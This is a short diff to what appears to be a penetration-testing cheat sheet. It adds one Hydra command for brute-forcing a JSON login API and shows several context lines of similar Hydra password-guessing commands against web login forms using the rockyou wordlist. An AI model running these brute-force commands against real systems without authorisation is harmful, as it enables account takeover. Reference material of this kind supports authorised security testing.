@@ -211,6 +211,7 @@ https://github.com/frizb/Hydra-Cheatsheet
 hydra -l admin -P rockyou.txt <IP> http-post-form "/path/to/login.php:username=admin&password=^PASS^:Invalid Password" -t 64 -V
 hydra -l none -P rockyou.txt <IP> http-post-form "/path/to/login.php:username=admin&password=^PASS^:Invalid Password" -t 64 -V
 hydra -l admin -P rockyou.txt -t -s 443 -f <IP> http-get /
+hydra -l <USERID> -P rockyou.txt <IP> -s <PORT> http-post-form "/api/session/authenticate:{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:Authentication failed:H=Content-Type\: application/json" -t 64
 ```
 
 ### php payloads
